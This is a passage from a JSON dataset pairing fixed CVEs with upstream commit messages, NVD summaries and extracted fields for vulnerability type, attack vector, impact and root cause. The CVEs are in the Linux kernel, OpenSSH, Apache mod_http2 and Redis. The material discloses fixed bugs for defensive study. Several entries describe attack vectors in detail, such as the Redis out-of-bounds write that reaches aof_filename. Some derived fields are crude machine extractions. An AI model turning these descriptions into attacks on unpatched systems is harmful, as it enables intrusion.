a lot of a leak\n(at most we are leaking uninitialized 64bit value off the kernel stack,\nand in a fairly constrained situation, at that), but the fix is trivial,\nso...\n\nCc: stable@vger.kernel.org\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n[ This sat in different branch from the uaccess fixes since mid-August ]\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The __get_user_asm_ex macro in arch\/x86\/include\/asm\/uaccess.h in the Linux kernel before 4.7.5 does not initialize a certain integer variable, which allows local users to obtain sensitive information from kernel stack memory by triggering failure of a get_user_ex call.","commit_message_1":"fix minor infoleak in get_user_ex ( ) get_user_ex ( x , ptr ) should zero x on failure","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by triggering failure of a get _ user _ ex call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain integer variable ","Attack Type":"local attacker"},{"commit_id":"9590232bb4f4cc824f3425a6e1349afbe6d6d2b7","cve_id":"CVE-2016-9120","cwe_id":"CWE-416","commit_message":"staging\/android\/ion : fix a race condition in the ion driver\n\nThere is a use-after-free problem in the ion driver.\nThis is caused by a race condition in the ion_ioctl()\nfunction.\n\nA handle has ref count of 1 and two tasks on different\ncpus calls ION_IOC_FREE simultaneously.\n\ncpu 0                                   cpu 1\n-------------------------------------------------------\nion_handle_get_by_id()\n(ref == 2)\n                            ion_handle_get_by_id()\n                            (ref == 3)\n\nion_free()\n(ref == 2)\n\nion_handle_put()\n(ref == 1)\n\n                            ion_free()\n                            (ref == 0 so ion_handle_destroy() is\n                            called\n                            and the handle is freed.)\n\n                            ion_handle_put() is called and it\n                            decreases the slub's next free pointer\n\nThe problem is detected as an unaligned access in the\nspin lock functions since it uses load exclusive\n instruction. In some cases it corrupts the slub's\nfree pointer which causes a mis-aligned access to the\nnext free pointer.(kmalloc returns a pointer like\nffffc0745b4580aa). And it causes lots of other\nhard-to-debug problems.\n\nThis symptom is caused since the first member in the\nion_handle structure is the reference count and the\nion driver decrements the reference after it has been\nfreed.\n\nTo fix this problem client->lock mutex is extended\nto protect all the codes that uses the handle.\n\nSigned-off-by: Eun Taik Lee <eun.taik.lee@samsung.com>\nReviewed-by: Laura Abbott <labbott@redhat.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"Race condition in the ion_ioctl function in drivers\/staging\/android\/ion\/ion.c in the Linux kernel before 4.6 allows local users to gain privileges or cause a denial of service (use-after-free) by calling ION_IOC_FREE on two CPUs at the same time.","commit_message_1":"fix a race condition in the ion driver there is a use-after-free problem in the ion driver","Vulnerability Type":"Use After Free","Attack Vector":"by calling ion _ ioc _ free on two cpus at the same time","Impact":"gain privileges or cause a denial of service ( use - after - free )","Root Cause":"caused by a race condition ion_ioctl function","Attack Type":"local attacker"},{"commit_id":"05692d7005a364add85c6e25a6c4447ce08f913a","cve_id":"CVE-2016-9084","cwe_id":"CWE-190","commit_message":"vfio\/pci: Fix integer overflows, bitmask check\n\nThe VFIO_DEVICE_SET_IRQS ioctl did not sufficiently sanitize\nuser-supplied integers, potentially allowing memory corruption. This\npatch adds appropriate integer overflow checks, checks the range bounds\nfor VFIO_IRQ_SET_DATA_NONE, and also verifies that only single element\nin the VFIO_IRQ_SET_DATA_TYPE_MASK bitmask is set.\nVFIO_IRQ_SET_ACTION_TYPE_MASK is already correctly checked later in\nvfio_pci_set_irqs_ioctl().\n\nFurthermore, a kzalloc is changed to a kcalloc because the use of a\nkzalloc with an integer multiplication allowed an integer overflow\ncondition to be reached without this patch. kcalloc checks for overflow\nand should prevent a similar occurrence.\n\nSigned-off-by: Vlad Tsyrklevich <vlad@tsyrklevich.net>\nSigned-off-by: Alex Williamson <alex.williamson@redhat.com>","summary":"drivers\/vfio\/pci\/vfio_pci_intrs.c in the Linux kernel through 4.8.11 misuses the kzalloc function, which allows local users to cause a denial of service (integer overflow) or have unspecified other impact by leveraging access to a vfio PCI device file.","commit_message_1":"fix integer overflow , bitmask check the vfio_device_set_irqs ioctl did not sufficiently sanitize user-supplied integer , potentially allowing memory corruption","Vulnerability Type":"integer overflow","Attack Vector":"by leveraging access to a vfio pci device file","Impact":"cause a denial of service ( integer overflow ) or have unspecified other impact","Root Cause":"caused by the improper use of the kzalloc function by vfio_pci_intrs.c","Attack Type":"local attacker"},{"commit_id":"ec165c392ca54317dbe3064a8c200de6531e89ad","cve_id":"CVE-2016-8858","cwe_id":"CWE-399","commit_message":"upstream commit\n\nUnregister the KEXINIT handler after message has been\nreceived. Otherwise an unauthenticated peer can repeat the KEXINIT and cause\nallocation of up to 128MB -- until the connection is closed. Reported by\nshilei-c at 360.cn\n\nUpstream-ID: 43649ae12a27ef94290db16d1a98294588b75c05","summary":"** DISPUTED ** The kex_input_kexinit function in kex.c in OpenSSH 6.x and 7.x through 7.3 allows remote attackers to cause a denial of service (memory consumption) by sending many duplicate KEXINIT requests.  NOTE: a third party reports that *OpenSSH upstream does not consider this as a security issue.*","commit_message_1":"upstream commit unregister the kexinit handler after message ha been received","Vulnerability Type":"Resource Management Errors","Attack Vector":"by sending many duplicate kexinit requests","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"29c63b786ae028d82405421585e91283c8fa0da3","cve_id":"CVE-2016-8740","cwe_id":"CWE-20","commit_message":"SECURITY: CVE-2016-8740\n\nmod_http2: properly crafted, endless HTTP\/2 CONTINUATION frames could be used to exhaust all server's memory.\n\nReported by: Naveen Tiwari <naveen.tiwari@asu.edu> and CDF\/SEFCOM at Arizona State University\n\n\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/httpd\/httpd\/trunk@1772576 13f79535-47bb-0310-9956-ffa450edef68","summary":"The mod_http2 module in the Apache HTTP Server 2.4.17 through 2.4.23, when the Protocols configuration includes h2 or h2c, does not restrict request-header length, which allows remote attackers to cause a denial of service (memory consumption) via crafted CONTINUATION frames in an HTTP\/2 request.","commit_message_1":"<cve_id> mod_http2 : properly crafted , endless http\/<number> continuation frame could be used to exhaust all server 's memory","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted continuation frames in an http \/ 2 request","Impact":"cause a denial of service ( memory consumption )","Root Cause":"does not restrict request - header length ","Attack Type":"remote attacker"},{"commit_id":"fac8e0f579695a3ecbc4d3cac369139d7f819971","cve_id":"CVE-2016-8666","cwe_id":"CWE-400","commit_message":"tunnels: Don't apply GRO to multiple layers of encapsulation.\n\nWhen drivers express support for TSO of encapsulated packets, they\nonly mean that they can do it for one layer of encapsulation.\nSupporting additional levels would mean updating, at a minimum,\nmore IP length fields and they are unaware of this.\n\nNo encapsulation device expresses support for handling offloaded\nencapsulated packets, so we won't generate these types of frames\nin the transmit path. However, GRO doesn't have a check for\nmultiple levels of encapsulation and will attempt to build them.\n\nUDP tunnel GRO actually does prevent this situation but it only\nhandles multiple UDP tunnels stacked on top of each other. This\ngeneralizes that solution to prevent any kind of tunnel stacking\nthat would cause problems.\n\nFixes: bf5a755f (\"net-gre-gro: Add GRE support to the GRO stack\")\nSigned-off-by: Jesse Gross <jesse@kernel.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The IP stack in the Linux kernel before 4.6 allows remote attackers to cause a denial of service (stack consumption and panic) or possibly have unspecified other impact by triggering use of the GRO path for packets with tunnel stacking, as demonstrated by interleaved IPv4 headers and GRE headers, a related issue to CVE-2016-7039.","commit_message_1":"do n't apply gro to multiple layer of encapsulation","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"by triggering use of the gro path for packets with tunnel stacking , as demonstrated by interleaved ipv4 headers and gre headers , a related issue to cve - 2016 - 7039","Impact":"cause a denial of service ( stack consumption and panic ) or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"ded89912156b1a47d940a0c954c43afbabd0c42c","cve_id":"CVE-2016-8658","cwe_id":"CWE-119","commit_message":"brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()\n\nUser-space can choose to omit NL80211_ATTR_SSID and only provide raw\nIE TLV data. When doing so it can provide SSID IE with length exceeding\nthe allowed size. The driver further processes this IE copying it\ninto a local variable without checking the length. Hence stack can be\ncorrupted and used as exploit.\n\nCc: stable@vger.kernel.org # v4.7\nReported-by: Daxing Guo <freener.gdx@gmail.com>\nReviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>\nReviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>\nReviewed-by: Franky Lin <franky.lin@broadcom.com>\nSigned-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>\nSigned-off-by: Kalle Valo <kvalo@codeaurora.org>","summary":"Stack-based buffer overflow in the brcmf_cfg80211_start_ap function in drivers\/net\/wireless\/broadcom\/brcm80211\/brcmfmac\/cfg80211.c in the Linux kernel before 4.7.5 allows local users to cause a denial of service (system crash) or possibly have unspecified other impact via a long SSID Information Element in a command to a Netlink socket.","commit_message_1":"avoid potential stack overflow in brcmf_cfg80211_start_ap ( ) user-space can choose to omit nl80211_attr_ssid and only provide raw ie tlv data","Vulnerability Type":"buffer overflow","Attack Vector":"via a long ssid information element in a command to a netlink socket","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by improper bounds checking by the brcmf_cfg80211_start_ap function","Attack Type":"local attacker"},{"commit_id":"84ac7260236a49c79eede91617700174c2c19b0c","cve_id":"CVE-2016-8655","cwe_id":"CWE-416","commit_message":"packet: fix race condition in packet_set_ring\n\nWhen packet_set_ring creates a ring buffer it will initialize a\nstruct timer_list if the packet version is TPACKET_V3. This value\ncan then be raced by a different thread calling setsockopt to\nset the version to TPACKET_V1 before packet_set_ring has finished.\n\nThis leads to a use-after-free on a function pointer in the\nstruct timer_list when the socket is closed as the previously\ninitialized timer will not be deleted.\n\nThe bug is fixed by taking lock_sock(sk) in packet_setsockopt when\nchanging the packet version while also taking the lock at the start\nof packet_set_ring.\n\nFixes: f6fb8f100b80 (\"af-packet: TPACKET_V3 flexible buffer implementation.\")\nSigned-off-by: Philip Pettersson <philip.pettersson@gmail.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Race condition in net\/packet\/af_packet.c in the Linux kernel through 4.8.12 allows local users to gain privileges or cause a denial of service (use-after-free) by leveraging the CAP_NET_RAW capability to change a socket version, related to the packet_set_ring and packet_setsockopt functions.","commit_message_1":"fix race condition in packet_set_ring when packet_set_ring creates a ring buffer it will initialize a struct timer_list if the packet version is tpacket_v3","Vulnerability Type":"Use After Free","Attack Vector":"by leveraging the cap _ net _ raw capability to change a socket version , related to the packet _ set _ ring and packet _ setsockopt functions","Impact":"gain privileges or cause a denial of service ( use - after - free )","Root Cause":"caused by a race condition and use-after-free memory errors","Attack Type":"local attacker"},{"commit_id":"f5527fffff3f002b0a6b376163613b82f69de073","cve_id":"CVE-2016-8650","cwe_id":"CWE-20","commit_message":"mpi: Fix NULL ptr dereference in mpi_powm() [ver #3]\n\nThis fixes CVE-2016-8650.\n\nIf mpi_powm() is given a zero exponent, it wants to immediately return\neither 1 or 0, depending on the modulus.  However, if the result was\ninitalised with zero limb space, no limbs space is allocated and a\nNULL-pointer exception ensues.\n\nFix this by allocating a minimal amount of limb space for the result when\nthe 0-exponent case when the result is 1 and not touching the limb space\nwhen the result is 0.\n\nThis affects the use of RSA keys and X.509 certificates that carry them.\n\nBUG: unable to handle kernel NULL pointer dereference at           (null)\nIP: [<ffffffff8138ce5d>] mpi_powm+0x32\/0x7e6\nPGD 0\nOops: 0002 [#1] SMP\nModules linked in:\nCPU: 3 PID: 3014 Comm: keyctl Not tainted 4.9.0-rc6-fscache+ #278\nHardware name: ASUS All Series\/H97-PLUS, BIOS 2306 10\/09\/2014\ntask: ffff8804011944c0 task.stack: ffff880401294000\nRIP: 0010:[<ffffffff8138ce5d>]  [<ffffffff8138ce5d>] mpi_powm+0x32\/0x7e6\nRSP: 0018:ffff880401297ad8  EFLAGS: 00010212\nRAX: 0000000000000000 RBX: ffff88040868bec0 RCX: ffff88040868bba0\nRDX: ffff88040868b260 RSI: ffff88040868bec0 RDI: ffff88040868bee0\nRBP: ffff880401297ba8 R08: 0000000000000000 R09: 0000000000000000\nR10: 0000000000000047 R11: ffffffff8183b210 R12: 0000000000000000\nR13: ffff8804087c7600 R14: 000000000000001f R15: ffff880401297c50\nFS:  00007f7a7918c700(0000) GS:ffff88041fb80000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 0000000000000000 CR3: 0000000401250000 CR4: 00000000001406e0\nStack:\n ffff88040868bec0 0000000000000020 ffff880401297b00 ffffffff81376cd4\n 0000000000000100 ffff880401297b10 ffffffff81376d12 ffff880401297b30\n ffffffff81376f37 0000000000000100 0000000000000000 ffff880401297ba8\nCall Trace:\n [<ffffffff81376cd4>] ? __sg_page_iter_next+0x43\/0x66\n [<ffffffff81376d12>] ? sg_miter_get_next_page+0x1b\/0x5d\n [<ffffffff81376f37>] ? sg_miter_next+0x17\/0xbd\n [<ffffffff8138ba3a>] ? mpi_read_raw_from_sgl+0xf2\/0x146\n [<ffffffff8132a95c>] rsa_verify+0x9d\/0xee\n [<ffffffff8132acca>] ? pkcs1pad_sg_set_buf+0x2e\/0xbb\n [<ffffffff8132af40>] pkcs1pad_verify+0xc0\/0xe1\n [<ffffffff8133cb5e>] public_key_verify_signature+0x1b0\/0x228\n [<ffffffff8133d974>] x509_check_for_self_signed+0xa1\/0xc4\n [<ffffffff8133cdde>] x509_cert_parse+0x167\/0x1a1\n [<ffffffff8133d609>] x509_key_preparse+0x21\/0x1a1\n [<ffffffff8133c3d7>] asymmetric_key_preparse+0x34\/0x61\n [<ffffffff812fc9f3>] key_create_or_update+0x145\/0x399\n [<ffffffff812fe227>] SyS_add_key+0x154\/0x19e\n [<ffffffff81001c2b>] do_syscall_64+0x80\/0x191\n [<ffffffff816825e4>] entry_SYSCALL64_slow_path+0x25\/0x25\nCode: 56 41 55 41 54 53 48 81 ec a8 00 00 00 44 8b 71 04 8b 42 04 4c 8b 67 18 45 85 f6 89 45 80 0f 84 b4 06 00 00 85 c0 75 2f 41 ff ce <49> c7 04 24 01 00 00 00 b0 01 75 0b 48 8b 41 18 48 83 38 01 0f\nRIP  [<ffffffff8138ce5d>] mpi_powm+0x32\/0x7e6\n RSP <ffff880401297ad8>\nCR2: 0000000000000000\n---[ end trace d82015255d4a5d8d ]---\n\nBasically, this is a backport of a libgcrypt patch:\n\n\thttp:\/\/git.gnupg.org\/cgi-bin\/gitweb.cgi?p=libgcrypt.git;a=patch;h=6e1adb05d290aeeb1c230c763970695f4a538526\n\nFixes: cdec9cb5167a (\"crypto: GnuPG based MPI lib - source files (part 1)\")\nSigned-off-by: Andrey Ryabinin <aryabinin@virtuozzo.com>\nSigned-off-by: David Howells <dhowells@redhat.com>\ncc: Dmitry Kasatkin <dmitry.kasatkin@gmail.com>\ncc: linux-ima-devel@lists.sourceforge.net\ncc: stable@vger.kernel.org\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"The mpi_powm function in lib\/mpi\/mpi-pow.c in the Linux kernel through 4.8.11 does not ensure that memory is allocated for limb data, which allows local users to cause a denial of service (stack memory corruption and panic) via an add_key system call for an RSA key with a zero exponent.","commit_message_1":"fix null ptr dereference in mpi_powm ( ) [ ver # <number> ] this fix <cve_id>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an add _ key system call for an rsa key with a zero exponent","Impact":"cause a denial of service ( stack memory corruption and panic )","Root Cause":"does not ensure that memory is allocated for limb data","Attack Type":"local attacker"},{"commit_id":"4afa5f9617927453ac04b24b584f6c718dfb4f45","cve_id":"CVE-2016-8646","cwe_id":"CWE-476","commit_message":"crypto: algif_hash - Only export and import on sockets with data\n\nThe hash_accept call fails to work on sockets that have not received\nany data.  For some algorithm implementations it may cause crashes.\n\nThis patch fixes this by ensuring that we only export and import on\nsockets that have received data.\n\nCc: stable@vger.kernel.org\nReported-by: Harsh Jain <harshjain.prof@gmail.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>\nTested-by: Stephan Mueller <smueller@chronox.de>","summary":"The hash_accept function in crypto\/algif_hash.c in the Linux kernel before 4.3.6 allows local users to cause a denial of service (OOPS) by attempting to trigger use of in-kernel hash algorithms for a socket that has received zero bytes of data.","commit_message_1":"algif_hash - only export and import on socket with data the hash_accept call fails to work on socket that have not received any data","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by attempting to trigger use of in - kernel hash algorithms for a socket that has received zero bytes of data","Impact":"cause a denial of service ( oops )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"ac6e780070e30e4c35bd395acfe9191e6268bdd3","cve_id":"CVE-2016-8645","cwe_id":"CWE-284","commit_message":"tcp: take care of truncations done by sk_filter()\n\nWith syzkaller help, Marco Grassi found a bug in TCP stack,\ncrashing in tcp_collapse()\n\nRoot cause is that sk_filter() can truncate the incoming skb,\nbut TCP stack was not really expecting this to happen.\nIt probably was expecting a simple DROP or ACCEPT behavior.\n\nWe first need to make sure no part of TCP header could be removed.\nThen we need to adjust TCP_SKB_CB(skb)->end_seq\n\nMany thanks to syzkaller team and Marco for giving us a reproducer.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Marco Grassi <marco.gra@gmail.com>\nReported-by: Vladis Dronov <vdronov@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The TCP stack in the Linux kernel before 4.8.10 mishandles skb truncation, which allows local users to cause a denial of service (system crash) via a crafted application that makes sendto system calls, related to net\/ipv4\/tcp_ipv4.c and net\/ipv6\/tcp_ipv6.c.","commit_message_1":"take care of truncation done by sk_filter ( ) with syzkaller help , marco grassi found a bug in tcp stack , crashing in tcp_collapse ( ) root cause is that sk_filter ( ) can truncate the incoming skb , but tcp stack wa not really expecting this to happen","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted application that makes sendto system calls , related to net \/ ipv4 \/ tcp _ ipv4 . c and net \/ ipv6 \/ tcp _ ipv6 . c","Impact":"cause a denial of service","Root Cause":"caused by the failure to properly maintain certain BUG state","Attack Type":"local attacker"},{"commit_id":"667121ace9dbafb368618dbabcf07901c962ddac","cve_id":"CVE-2016-8633","cwe_id":"CWE-119","commit_message":"firewire: net: guard against rx buffer overflows\n\nThe IP-over-1394 driver firewire-net lacked input validation when\nhandling incoming fragmented datagrams.  A maliciously formed fragment\nwith a respectively large datagram_offset would cause a memcpy past the\ndatagram buffer.\n\nSo, drop any packets carrying a fragment with offset + length larger\nthan datagram_size.\n\nIn addition, ensure that\n  - GASP header, unfragmented encapsulation header, or fragment\n    encapsulation header actually exists before we access it,\n  - the encapsulated datagram or fragment is of nonzero size.\n\nReported-by: Eyal Itkin <eyal.itkin@gmail.com>\nReviewed-by: Eyal Itkin <eyal.itkin@gmail.com>\nFixes: CVE 2016-8633\nCc: stable@vger.kernel.org\nSigned-off-by: Stefan Richter <stefanr@s5r6.in-berlin.de>","summary":"drivers\/firewire\/net.c in the Linux kernel before 4.8.7, in certain unusual hardware configurations, allows remote attackers to execute arbitrary code via crafted fragmented packets.","commit_message_1":"net : guard against rx buffer overflow the ip-over-<number> driver firewire-net lacked input validation when handling incoming fragmented datagrams","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted fragmented packets","Impact":"execute arbitrary code","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"d9092f52d7e61dd1557f2db2400ddb430e85937e","cve_id":"CVE-2016-8630","cwe_id":"CWE-284","commit_message":"kvm: x86: Check memopp before dereference (CVE-2016-8630)\n\nCommit 41061cdb98 (\"KVM: emulate: do not initialize memopp\") removes a\ncheck for non-NULL under incorrect assumptions. An undefined instruction\nwith a ModR\/M byte with Mod=0 and R\/M-5 (e.g. 0xc7 0x15) will attempt\nto dereference a null pointer here.\n\nFixes: 41061cdb98a0bec464278b4db8e894a3121671f5\nMessage-Id: <1477592752-126650-2-git-send-email-osh@google.com>\nSigned-off-by: Owen Hofmann <osh@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The x86_decode_insn function in arch\/x86\/kvm\/emulate.c in the Linux kernel before 4.8.7, when KVM is enabled, allows local users to cause a denial of service (host OS crash) via a certain use of a ModR\/M byte in an undefined instruction.","commit_message_1":"x86 : check memopp before dereference ( <cve_id> ) commit 41061cdb98 ( `` kvm : emulate : do not initialize memopp '' ) remove a check for non-null under incorrect assumption","Vulnerability Type":"Improper Access Control","Attack Vector":"via a certain use of a modr \/ m byte in an undefined instruction","Impact":"cause a denial of service","Root Cause":"caused by the improper use of the x86_decode_insn function","Attack Type":"local attacker"},{"commit_id":"6d9f8e2462fc2c426d48c941edeb78e5df7d2977","cve_id":"CVE-2016-8339","cwe_id":"CWE-119","commit_message":"Security: CONFIG SET client-output-buffer-limit overflow fixed.\n\nThis commit fixes a vunlerability reported by Cory Duplantis\nof Cisco Talos, see TALOS-2016-0206 for reference.\n\nCONFIG SET client-output-buffer-limit accepts as client class \"master\"\nwhich is actually only used to implement CLIENT KILL. The \"master\" class\nhas ID 3. What happens is that the global structure:\n\n    server.client_obuf_limits[class]\n\nIs accessed with class = 3. However it is a 3 elements array, so writing\nthe 4th element means to write up to 24 bytes of memory *after* the end\nof the array, since the structure is defined as:\n\n    typedef struct clientBufferLimitsConfig {\n        unsigned long long hard_limit_bytes;\n        unsigned long long soft_limit_bytes;\n        time_t soft_limit_seconds;\n    } clientBufferLimitsConfig;\n\nEVALUATION OF IMPACT:\n\nChecking what's past the boundaries of the array in the global\n'server' structure, we find AOF state fields:\n\n    clientBufferLimitsConfig client_obuf_limits[CLIENT_TYPE_OBUF_COUNT];\n    \/* AOF persistence *\/\n    int aof_state;                  \/* AOF_(ON|OFF|WAIT_REWRITE) *\/\n    int aof_fsync;                  \/* Kind of fsync() policy *\/\n    char *aof_filename;             \/* Name of the AOF file *\/\n    int aof_no_fsync_on_rewrite;    \/* Don't fsync if a rewrite is in prog. *\/\n    int aof_rewrite_perc;           \/* Rewrite AOF if % growth is > M and... *\/\n    off_t aof_rewrite_min_size;     \/* the AOF file is at least N bytes. *\/\n    off_t aof_rewrite_base_size;    \/* AOF size on latest startup or rewrite. *\/\n    off_t aof_current_size;         \/* AOF current size. *\/\n\nWriting to most of these fields should be harmless and only cause problems in\nRedis persistence that should not escalate to security problems.\nHowever unfortunately writing to \"aof_filename\" could be potentially a\nsecurity issue depending on the access pattern.\n\nSearching for \"aof.filename\" accesses in the source code returns many different\nusages of the field, including using it as input for open(), logging to the\nRedis log file or syslog, and calling the rename() syscall.\n\nIt looks possible that attacks could lead at least to informations\ndisclosure of the state and data inside Redis. However note that the\nattacker must already have access to the server. But, worse than that,\nit looks possible that being able to change the AOF filename can be used\nto mount more powerful attacks: like overwriting random files with AOF\ndata (easily a potential security issue as demostrated here:\nhttp:\/\/antirez.com\/news\/96), or even more subtle attacks where the\nAOF filename is changed to a path were a malicious AOF file is loaded\nin order to exploit other potential issues when the AOF parser is fed\nwith untrusted input (no known issue known currently).\n\nThe fix checks the places where the 'master' class is specifiedf in\norder to access configuration data structures, and return an error in\nthis cases.\n\nWHO IS AT RISK?\n\nThe \"master\" client class was introduced in Redis in Jul 28 2015.\nEvery Redis instance released past this date is not vulnerable\nwhile all the releases after this date are. Notably:\n\n    Redis 3.0.x is NOT vunlerable.\n    Redis 3.2.x IS vulnerable.\n    Redis unstable is vulnerable.\n\nIn order for the instance to be at risk, at least one of the following\nconditions must be true:\n\n    1. The attacker can access Redis remotely and is able to send\n       the CONFIG SET command (often banned in managed Redis instances).\n\n    2. The attacker is able to control the \"redis.conf\" file and\n       can wait or trigger a server restart.\n\nThe problem was fixed 26th September 2016 in all the releases affected.","summary":"A buffer overflow in Redis 3.2.x prior to 3.2.4 causes arbitrary code execution when a crafted command is sent. An out of bounds write vulnerability exists in the handling of the client-output-buffer-limit option during the CONFIG SET command for the Redis data structure store. A crafted CONFIG SET command can lead to an out of bounds write potentially resulting in code execution.","commit_message_1":"config set client-output-buffer-limit overflow fixed","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially crafted CONFIG SET command","Impact":"execute arbitrary code","Root Cause":"caused by an out of bounds write vulnerability exists","Attack Type":"remote attacker"},{"commit_id":"c58d6c93680f28ac58984af61d0a7ebf4319c241","cve_id":"CVE-2016-7917","cwe_id":"CWE-125","commit_message":"netfilter: nfnetlink: correctly validate length of batch messages\n\nIf nlh->nlmsg_len is zero then an infinite loop is triggered because\n'skb_pull(skb, msglen);' pulls zero bytes.\n\nThe calculation in nlmsg_len() underflows if 'nlh->nlmsg_len <\nNLMSG_HDRLEN' which bypasses the length validation and will later\ntrigger an out-of-bound read.\n\nIf the length validation does fail then the malformed batch message is\ncopied back to userspace. However, we cannot do this because the\nnlh->nlmsg_len can be invalid. This leads to an out-of-bounds read in\nnetlink_ack:\n\n    [   41.455421] ==================================================================\n    [   41.456431] BUG: KASAN: slab-out-of-bounds in memcpy+0x1d\/0x40 at addr ffff880119e79340\n    [   41.456431] Read of size 4294967280 by task a.out\/987\n    [   41.456431] =============================================================================\n    [   41.456431] BUG kmalloc-512 (Not tainted): kasan: bad access detected\n    [   41.456431] -----------------------------------------------------------------------------\n    ...\n    [   41.456431] Bytes b4 ffff880119e79310: 00 00 00 00 d5 03 00 00 b0 fb fe ff 00 00 00 00  ................\n    [   41.456431] Object ffff880119e79320: 20 00 00 00 10 00 05 00 00 00 00 00 00 00 00 00   ...............\n    [   41.456431] Object ffff880119e79330: 14 00 0a 00 01 03 fc 40 45 56 11 22 33 10 00 05  .......@EV.\"3...\n    [   41.456431] Object ffff880119e79340: f0 ff ff ff 88 99 aa bb 00 14 00 0a 00 06 fe fb  ................\n                                            ^^ start of batch nlmsg with\n                                               nlmsg_len=4294967280\n    ...\n    [   41.456431] Memory state around the buggy address:\n    [   41.456431]  ffff880119e79400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n    [   41.456431]  ffff880119e79480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n    [   41.456431] >ffff880119e79500: 00 00 00 00 fc fc fc fc fc fc fc fc fc fc fc fc\n    [   41.456431]                                ^\n    [   41.456431]  ffff880119e79580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n    [   41.456431]  ffff880119e79600: fc fc fc fc fc fc fc fc fc fc fb fb fb fb fb fb\n    [   41.456431] ==================================================================\n\nFix this with better validation of nlh->nlmsg_len and by setting\nNFNL_BATCH_FAILURE if any batch message fails length validation.\n\nCAP_NET_ADMIN is required to trigger the bugs.\n\nFixes: 9ea2aa8b7dba (\"netfilter: nfnetlink: validate nfnetlink header from batch\")\nSigned-off-by: Phil Turnbull <phil.turnbull@oracle.com>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"The nfnetlink_rcv_batch function in net\/netfilter\/nfnetlink.c in the Linux kernel before 4.5 does not check whether a batch message's length field is large enough, which allows local users to obtain sensitive information from kernel memory or cause a denial of service (infinite loop or out-of-bounds read) by leveraging the CAP_NET_ADMIN capability.","commit_message_1":"nfnetlink : correctly validate length of batch message if nlh- > nlmsg_len is zero then an infinite loop is triggered because 'skb_pull ( skb , msglen ) ; ' pull zero byte","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"by leveraging the cap _ net _ admin capability","Impact":"obtain sensitive information from kernel memory or cause a denial of service ( infinite loop or out - of - bounds read )","Root Cause":"does not check whether a batch message ' s length field is large enough","Attack Type":"local attacker"},{"commit_id":"8148a73c9901a8794a50f950083c00ccf97d43b3","cve_id":"CVE-2016-7916","cwe_id":"CWE-362","commit_message":"proc: prevent accessing \/proc\/<PID>\/environ until it's ready\n\nIf \/proc\/<PID>\/environ gets read before the envp[] array is fully set up\nin create_{aout,elf,elf_fdpic,flat}_tables(), we might end up trying to\nread more bytes than are actually written, as env_start will already be\nset but env_end will still be zero, making the range calculation\nunderflow, allowing to read beyond the end of what has been written.\n\nFix this as it is done for \/proc\/<PID>\/cmdline by testing env_end for\nzero.  It is, apparently, intentionally set last in create_*_tables().\n\nThis bug was found by the PaX size_overflow plugin that detected the\narithmetic underflow of 'this_len = env_end - (env_start + src)' when\nenv_end is still zero.\n\nThe expected consequence is that userland trying to access\n\/proc\/<PID>\/environ of a not yet fully set up process may get\ninconsistent data as we're in the middle of copying in the environment\nvariables.\n\nFixes: https:\/\/forums.grsecurity.net\/viewtopic.php?f=3&t=4363\nFixes: https:\/\/bugzilla.kernel.org\/show_bug.cgi?id=116461\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Emese Revfy <re.emese@gmail.com>\nCc: Pax Team <pageexec@freemail.hu>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: Mateusz Guzik <mguzik@redhat.com>\nCc: Alexey Dobriyan <adobriyan@gmail.com>\nCc: Cyrill Gorcunov <gorcunov@openvz.org>\nCc: Jarod Wilson <jarod@redhat.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Race condition in the environ_read function in fs\/proc\/base.c in the Linux kernel before 4.5.4 allows local users to obtain sensitive information from kernel memory by reading a \/proc\/*\/environ file during a process-setup time interval in which environment-variable copying is incomplete.","commit_message_1":"prevent accessing \/proc\/ < pid > \/environ until it 's ready if \/proc\/ < pid > \/environ get read before the envp [ ] array is fully set up in create_ { aout , elf , elf_fdpic , flat } _tables ( ) , we might end up trying to read more byte than are actually written , a env_start will already be set but env_end will still be zero , making the range calculation underflow , allowing to read beyond the end of what ha been written","Vulnerability Type":"Race Condition","Attack Vector":"by reading a \/ proc 